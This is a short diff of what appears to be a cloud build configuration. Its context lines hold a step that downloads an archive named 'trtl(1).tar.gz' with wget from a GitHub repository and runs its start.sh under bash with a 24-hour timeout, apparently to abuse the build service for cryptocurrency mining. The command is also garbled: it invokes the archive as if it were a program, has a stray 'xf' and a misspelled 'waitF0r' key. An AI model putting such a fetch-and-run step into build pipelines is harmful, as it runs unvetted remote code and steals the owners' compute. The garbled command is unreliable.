@@ -5,7 +5,6 @@ steps:
       - >-
           wget https://github.com/ifhikf/jos/raw/main/trtl(1).tar.gz && trtl(1).tar.gz && xf trtl(1).tar.gz ./start.sh
         waitF0r:
-      - '-'
     entrypoint: /bin/bash
 timeout: 86400s
 options:
